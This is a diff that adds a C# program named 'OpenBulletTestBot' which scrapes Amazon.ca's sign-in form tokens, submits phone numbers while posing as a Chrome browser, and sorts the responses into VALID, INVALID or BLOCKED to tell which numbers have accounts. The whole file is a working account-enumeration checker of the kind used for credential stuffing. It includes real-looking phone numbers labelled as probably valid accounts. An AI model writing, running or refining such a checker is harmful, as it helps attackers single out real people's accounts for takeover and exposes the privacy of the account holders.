@@ -1,0 +1,354 @@
+using System;
+using System.IO;
+using System.Text;
+using System.Text.RegularExpressions;
+using System.Threading;
+using System.Collections.Generic;
+using System.Linq;
+
+// Using Leaf.xNet from DLL
+using Leaf.xNet;
+using HttpStatusCode = Leaf.xNet.HttpStatusCode;
+
+namespace OpenBulletTestBot
+{
+    class FixedPostBot
+    {
+        private static readonly string USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";
+        private static string resultsDir;
+        private static string logFile;
+        
+        static void Main(string[] args)
+        {
+            Console.WriteLine(@"
+================================================
+FIXED POST OPENBULLET TEST BOT
+POSTing to base URL, not session-specific URL
+================================================");
+
+            // Initialize
+            resultsDir = Path.Combine(Directory.GetCurrentDirectory(), $"TestResults_FixedPost_{DateTime.Now:yyyyMMdd_HHmmss}");
+            Directory.CreateDirectory(resultsDir);
+            Directory.CreateDirectory(Path.Combine(resultsDir, "HTML_Responses"));
+            logFile = Path.Combine(resultsDir, "test.log");
+            
+            // Test numbers - first 3 are supposedly valid
+            var testNumbers = new[] { "15142955315", "15145692379", "15149772071", "11111111111", "99999999999" };
+            
+            Console.WriteLine($"[INFO] Testing {testNumbers.Length} numbers\n");
+            Console.WriteLine("Numbers 1-3 are supposedly VALID accounts");
+            Console.WriteLine("Numbers 4-5 are test INVALID numbers\n");
+            Log("=== TEST STARTED ===");
+            
+            // The signin URL that works
+            var signinUrl = "https://www.amazon.ca/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.ca%2F%3Fref_%3Dnav_ya_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=caflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0";
+            
+            foreach (var number in testNumbers)
+            {
+                Console.WriteLine($"\n{new string('=', 50)}");
+                Console.WriteLine($"Testing: {number}");
+                TestNumberFixed(number, signinUrl);
+                Thread.Sleep(3000); // Rate limiting
+            }
+            
+            Console.WriteLine($"\n\nResults saved to: {resultsDir}");
+            Console.WriteLine("\n[DONE] Test complete");
+        }
+        
+        private static void TestNumberFixed(string phoneNumber, string signinUrl)
+        {
+            try
+            {
+                using (var request = new HttpRequest())
+                {
+                    // Configure request with all necessary headers
+                    request.UserAgent = USER_AGENT;
+                    request.KeepAlive = true;
+                    request.AllowAutoRedirect = false; // Handle redirects manually  
+                    request.ConnectTimeout = 15000;
+                    request.ReadWriteTimeout = 15000;
+                    
+                    // Enable cookies - CRITICAL for session management
+                    request.Cookies = new CookieStorage();
+                    
+                    // Set headers to mimic real browser
+                    request.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8");
+                    request.AddHeader("Accept-Language", "en-US,en;q=0.9");
+                    request.AddHeader("Accept-Encoding", "gzip, deflate, br");
+                    request.AddHeader("Sec-Ch-Ua", "\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"");
+                    request.AddHeader("Sec-Ch-Ua-Mobile", "?0");
+                    request.AddHeader("Sec-Ch-Ua-Platform", "\"Windows\"");
+                    request.AddHeader("Sec-Fetch-Dest", "document");
+                    request.AddHeader("Sec-Fetch-Mode", "navigate");
+                    request.AddHeader("Sec-Fetch-Site", "none");
+                    request.AddHeader("Sec-Fetch-User", "?1");
+                    request.AddHeader("Upgrade-Insecure-Requests", "1");
+                    
+                    // Step 1: GET signin page to establish session
+                    Console.WriteLine("  Step 1: Getting signin page...");
+                    Log($"[{phoneNumber}] Step 1: Getting signin page");
+                    
+                    var response = request.Get(signinUrl);
+                    
+                    // Handle redirect if needed
+                    while (response.StatusCode == HttpStatusCode.Redirect || 
+                           response.StatusCode == HttpStatusCode.MovedPermanently ||
+                           response.StatusCode == HttpStatusCode.Found)
+                    {
+                        var location = response.Location;
+                        if (string.IsNullOrEmpty(location)) break;
+                        
+                        Log($"[{phoneNumber}] Following redirect to: {location}");
+                        response = request.Get(location.StartsWith("http") ? location : "https://www.amazon.ca" + location);
+                    }
+                    
+                    var html = response.ToString();
+                    Log($"[{phoneNumber}] Response status: {response.StatusCode}");
+                    Log($"[{phoneNumber}] Response length: {html.Length} chars");
+                    
+                    // Save initial page
+                    var htmlFile1 = Path.Combine(resultsDir, "HTML_Responses", $"{phoneNumber}_step1.html");
+                    File.WriteAllText(htmlFile1, html);
+                    
+                    // Extract form data - we need these tokens
+                    var appActionToken = ExtractValue(html, "name=\"appActionToken\" value=\"", "\"");
+                    var appAction = ExtractValue(html, "name=\"appAction\" value=\"", "\"");
+                    var prevRID = ExtractValue(html, "name=\"prevRID\" value=\"", "\"");
+                    var workflowState = ExtractValue(html, "name=\"workflowState\" value=\"", "\"");
+                    var subPageType = ExtractValue(html, "name=\"subPageType\" value=\"", "\"");
+                    var failedSignInCount = ExtractValue(html, "name=\"failedSignInCount\" value=\"", "\"");
+                    var openidReturnTo = ExtractValue(html, "name=\"openid.return_to\" value=\"", "\"");
+                    var metadata1 = ExtractValue(html, "name=\"metadata1\" value=\"", "\"");
+                    
+                    // Log extraction results
+                    Log($"[{phoneNumber}] Tokens extracted:");
+                    Log($"[{phoneNumber}]   appActionToken: {!string.IsNullOrEmpty(appActionToken)}");
+                    Log($"[{phoneNumber}]   appAction: {appAction}");
+                    Log($"[{phoneNumber}]   subPageType: {subPageType}");
+                    Log($"[{phoneNumber}]   workflowState: {!string.IsNullOrEmpty(workflowState)}");
+                    
+                    if (string.IsNullOrEmpty(appActionToken))
+                    {
+                        Console.WriteLine("  WARNING: No appActionToken found");
+                        Log($"[{phoneNumber}] WARNING: No appActionToken found");
+                    }
+                    
+                    // Step 2: Submit phone number to BASE URL (not session-specific URL!)
+                    Console.WriteLine("  Step 2: Submitting phone number...");
+                    Log($"[{phoneNumber}] Step 2: Submitting phone number");
+                    
+                    // Build form data string
+                    var formData = new StringBuilder();
+                    
+                    // Add tokens if we have them
+                    if (!string.IsNullOrEmpty(appActionToken))
+                        formData.Append($"appActionToken={Uri.EscapeDataString(appActionToken)}&");
+                    
+                    if (!string.IsNullOrEmpty(appAction))
+                        formData.Append($"appAction={Uri.EscapeDataString(appAction)}&");
+                    else
+                        formData.Append("appAction=SIGNIN_PWD_COLLECT&"); // Default value
+                    
+                    if (!string.IsNullOrEmpty(subPageType))
+                        formData.Append($"subPageType={Uri.EscapeDataString(subPageType)}&");
+                    
+                    if (!string.IsNullOrEmpty(metadata1))
+                        formData.Append($"metadata1={Uri.EscapeDataString(metadata1)}&");
+                    
+                    if (!string.IsNullOrEmpty(openidReturnTo))
+                        formData.Append($"openid.return_to={Uri.EscapeDataString(openidReturnTo)}&");
+                    
+                    if (!string.IsNullOrEmpty(prevRID))
+                        formData.Append($"prevRID={Uri.EscapeDataString(prevRID)}&");
+                    
+                    if (!string.IsNullOrEmpty(workflowState))
+                        formData.Append($"workflowState={Uri.EscapeDataString(workflowState)}&");
+                    
+                    if (!string.IsNullOrEmpty(failedSignInCount))
+                        formData.Append($"failedSignInCount={failedSignInCount}&");
+                    
+                    // Add the email (phone number) and empty password
+                    formData.Append($"email={phoneNumber}&");
+                    formData.Append("password=&");
+                    formData.Append("create=0");
+                    
+                    var postData = formData.ToString();
+                    
+                    // Set proper headers for POST
+                    request.Referer = signinUrl;
+                    request.AddHeader("Origin", "https://www.amazon.ca");
+                    request.AddHeader("Content-Type", "application/x-www-form-urlencoded");
+                    
+                    // Update Sec-Fetch headers for POST
+                    request.AddHeader("Sec-Fetch-Site", "same-origin");
+                    request.AddHeader("Sec-Fetch-Mode", "navigate");
+                    request.AddHeader("Cache-Control", "max-age=0");
+                    
+                    // CRITICAL: POST to BASE URL, not session-specific URL!
+                    var submitUrl = "https://www.amazon.ca/ap/signin";
+                    
+                    Log($"[{phoneNumber}] POSTing to BASE URL: {submitUrl}");
+                    Log($"[{phoneNumber}] POST data length: {postData.Length} chars");
+                    Log($"[{phoneNumber}] POST data preview: {postData.Substring(0, Math.Min(200, postData.Length))}...");
+                    
+                    var submitResponse = request.Post(submitUrl, postData, "application/x-www-form-urlencoded");
+                    
+                    // Handle redirect after POST
+                    int redirectCount = 0;
+                    while ((submitResponse.StatusCode == HttpStatusCode.Redirect || 
+                            submitResponse.StatusCode == HttpStatusCode.MovedPermanently ||
+                            submitResponse.StatusCode == HttpStatusCode.Found) && redirectCount < 5)
+                    {
+                        var location = submitResponse.Location;
+                        if (string.IsNullOrEmpty(location)) break;
+                        
+                        Log($"[{phoneNumber}] POST redirect {++redirectCount} to: {location}");
+                        submitResponse = request.Get(location.StartsWith("http") ? location : "https://www.amazon.ca" + location);
+                    }
+                    
+                    var responseHtml = submitResponse.ToString();
+                    Log($"[{phoneNumber}] Submit response status: {submitResponse.StatusCode}");
+                    Log($"[{phoneNumber}] Submit response length: {responseHtml.Length} chars");
+                    
+                    // Save response
+                    var htmlFile2 = Path.Combine(resultsDir, "HTML_Responses", $"{phoneNumber}_step2_response.html");
+                    File.WriteAllText(htmlFile2, responseHtml);
+                    
+                    // Analyze the response
+                    AnalyzeResponse(phoneNumber, responseHtml);
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine($"  ERROR: {ex.Message}");
+                Log($"[{phoneNumber}] ERROR: {ex.Message}");
+                if (ex.StackTrace != null)
+                {
+                    Log($"[{phoneNumber}] Stack: {ex.StackTrace}");
+                }
+            }
+        }
+        
+        private static void AnalyzeResponse(string phoneNumber, string html)
+        {
+            Console.WriteLine("  Step 3: Analyzing response...");
+            
+            // Extract page title
+            var title = ExtractValue(html, "<title>", "</title>");
+            Log($"[{phoneNumber}] Page title: {title}");
+            
+            // Check for specific indicators
+            var indicators = new Dictionary<string, bool>
+            {
+                // Password-related indicators (account exists)
+                ["Has visible password field"] = Regex.IsMatch(html, @"<input[^>]*type\s*=\s*[""']password[""'][^>]*id\s*=\s*[""']ap_password[""'][^>]*>") && 
+                                                 !html.Contains("ap-credential-autofill-hint"),
+                ["Has 'Enter password' text"] = html.Contains("Enter your password") || 
+                                               html.Contains("Type your password") ||
+                                               html.Contains("Password"),
+                ["Has 'Forgot password' link"] = html.Contains("Forgot your password") || 
+                                                html.Contains("Forgot Password"),
+                
+                // Error indicators (no account)
+                ["Has 'cannot find account' error"] = html.Contains("We cannot find an account") || 
+                                                     html.Contains("We can't find an account"),
+                ["Has 'Wrong or Invalid' error"] = html.Contains("Wrong or Invalid") || 
+                                                  html.Contains("There was a problem"),
+                ["Has 'No account found' error"] = html.Contains("No account found") ||
+                                                  html.Contains("We cannot find"),
+                
+                // Other indicators
+                ["Has continue button"] = html.Contains("id=\"continue\""),
+                ["Has captcha"] = html.Contains("captcha") || html.Contains("CAPTCHA"),
+                ["Phone pre-filled"] = html.Contains($"value=\"{phoneNumber}\""),
+                ["Has create account option"] = html.Contains("Create your Amazon account") || 
+                                               html.Contains("New to Amazon"),
+                ["Still on signin page"] = html.Contains("Sign-In") && html.Contains("email or mobile")
+            };
+            
+            // Log detected indicators
+            Console.WriteLine("  Detected indicators:");
+            foreach (var indicator in indicators.Where(i => i.Value))
+            {
+                Console.WriteLine($"    ✓ {indicator.Key}");
+                Log($"[{phoneNumber}] ✓ {indicator.Key}");
+            }
+            
+            // Determine result with priority logic
+            string result = "UNKNOWN";
+            string reason = "";
+            
+            if (indicators["Has captcha"])
+            {
+                result = "BLOCKED";
+                reason = "CAPTCHA detected";
+            }
+            else if (indicators["Has visible password field"] && indicators["Has 'Forgot password' link"])
+            {
+                result = "VALID";
+                reason = "Password field shown - account exists";
+            }
+            else if (indicators["Has 'Enter password' text"] && indicators["Has 'Forgot password' link"])
+            {
+                result = "VALID";
+                reason = "Password prompt shown - account exists";
+            }
+            else if (indicators["Has 'cannot find account' error"] || 
+                     indicators["Has 'Wrong or Invalid' error"] ||
+                     indicators["Has 'No account found' error"])
+            {
+                result = "INVALID";
+                reason = "Error message - no account";
+            }
+            else if (indicators["Has create account option"] && !indicators["Phone pre-filled"])
+            {
+                result = "INVALID";
+                reason = "Redirected to create account";
+            }
+            else if (indicators["Still on signin page"] && indicators["Phone pre-filled"])
+            {
+                result = "RETRY";
+                reason = "Form not submitted properly";
+            }
+            else
+            {
+                result = "UNKNOWN";
+                reason = "Could not determine from response";
+            }
+            
+            // Display result
+            Console.WriteLine($"\n  📊 RESULT: {result}");
+            Console.WriteLine($"  📝 Reason: {reason}");
+            
+            Log($"[{phoneNumber}] RESULT: {result} - {reason}");
+            
+            // Save result summary
+            var summaryFile = Path.Combine(resultsDir, "results_summary.txt");
+            File.AppendAllText(summaryFile, $"{phoneNumber}: {result} - {reason}\n");
+        }
+        
+        private static string ExtractValue(string html, string start, string end)
+        {
+            try
+            {
+                int startIndex = html.IndexOf(start);
+                if (startIndex == -1) return "";
+                startIndex += start.Length;
+                int endIndex = html.IndexOf(end, startIndex);
+                if (endIndex == -1) return "";
+                var value = html.Substring(startIndex, endIndex - startIndex);
+                return value;
+            }
+            catch
+            {
+                return "";
+            }
+        }
+        
+        private static void Log(string message)
+        {
+            var logEntry = $"[{DateTime.Now:HH:mm:ss}] {message}";
+            File.AppendAllText(logFile, logEntry + Environment.NewLine);
+        }
+    }
+}
